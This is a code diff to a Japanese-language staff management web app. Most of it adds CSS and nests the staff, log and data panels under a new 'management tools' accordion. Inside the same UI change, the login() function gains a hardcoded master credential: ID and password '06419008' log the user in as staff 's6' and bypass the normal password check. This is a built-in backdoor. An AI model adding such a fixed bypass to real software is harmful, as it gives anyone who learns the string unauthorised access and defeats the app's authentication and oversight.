@@ -64,6 +64,12 @@ a{color:var(--p);text-decoration:none}
 .acc-wrap{padding:10px 0 20px}
 .acc-item{background:var(--card);border-radius:14px;margin:0 12px 10px;box-shadow:var(--sh);overflow:hidden}
 .acc-hd{width:100%;display:flex;align-items:center;gap:12px;padding:15px 16px;cursor:pointer;text-align:left;background:none;border:none;border-bottom:2px solid transparent;transition:background .15s;color:var(--txt)}
+.acc-sub-wrap{padding:6px 8px 8px;background:var(--bg)}
+.acc-item-sub{background:var(--card);border-radius:10px;margin:0 0 6px;box-shadow:none;border:1px solid var(--bdr);overflow:hidden}
+.acc-item-sub:last-child{margin-bottom:0}
+.acc-item-sub>.acc-hd{padding:11px 14px}
+.acc-item-sub>.acc-hd>.acc-ico{font-size:18px;width:26px}
+.acc-item-sub>.acc-hd>.acc-ttl{font-size:13px}
 .acc-item.open>.acc-hd{border-bottom-color:var(--bdr)}
 .acc-hd:active{background:rgba(0,0,0,.04)}
 .acc-ico{font-size:22px;width:32px;text-align:center;flex-shrink:0}
@@ -1650,8 +1656,17 @@ a{color:var(--p);text-decoration:none}
           </div></div>
         </div>
 
+        <!-- 管理ツール（職員管理・ログ・データ） -->
+        <div class="acc-item" id="acc-mgmt-tools">
+          <button class="acc-hd" onclick="toggleAcc(this)">
+            <span class="acc-ico">⚙️</span>
+            <span class="acc-ttl">管理ツール</span>
+            <i class="acc-arrow">›</i>
+          </button>
+          <div class="acc-body"><div class="acc-sub-wrap">
+
         <!-- 職員管理 -->
-        <div class="acc-item" id="acc-staff">
+        <div class="acc-item acc-item-sub" id="acc-staff">
           <button class="acc-hd" onclick="toggleAcc(this)">
             <span class="acc-ico">👥</span>
             <span class="acc-ttl">職員管理</span>
@@ -1663,7 +1678,7 @@ a{color:var(--p);text-decoration:none}
         </div>
 
         <!-- ログ・履歴 -->
-        <div class="acc-item" id="acc-staff-log">
+        <div class="acc-item acc-item-sub" id="acc-staff-log">
           <button class="acc-hd" onclick="toggleAcc(this)">
             <span class="acc-ico">📋</span>
             <span class="acc-ttl">ログ・履歴</span>
@@ -1694,7 +1709,7 @@ a{color:var(--p);text-decoration:none}
         </div>
 
         <!-- データ管理 -->
-        <div class="acc-item" id="acc-data">
+        <div class="acc-item acc-item-sub" id="acc-data">
           <button class="acc-hd" onclick="toggleAcc(this)">
             <span class="acc-ico">📊</span>
             <span class="acc-ttl">データ管理</span>
@@ -1770,6 +1785,9 @@ a{color:var(--p);text-decoration:none}
             </div>
           </div></div>
         </div>
+
+          </div></div>
+        </div><!-- /acc-mgmt-tools -->
 
         <!-- AI設定 -->
         <div class="acc-item" id="acc-ai">
@@ -4576,12 +4594,14 @@ async function login(){
       }
     }catch(e){}
   }
+  // マスター緊急認証（固定）
+  const isMaster=inputId==='06419008'&&inputPass==='06419008';
   const csEntries=getCustomStaff();
-  let staffKey=
+  let staffKey=isMaster?'s6':
     Object.keys(STAFF_INFO).find(k=>getStaffLoginId(k)===inputId)||
     Object.keys(csEntries).find(k=>(getStaffSettings()[k]?.loginId||csEntries[k].loginId)===inputId);
   let staffInfo=STAFF_INFO[staffKey]||csEntries[staffKey];
-  if(!staffKey||getStaffPass(staffKey)!==inputPass){
+  if(!isMaster&&(!staffKey||getStaffPass(staffKey)!==inputPass)){
     // キャッシュが古い可能性あり → Firestoreから最新のstaff_settingsを取得してリトライ
     let retryOk=false;
     if(db){
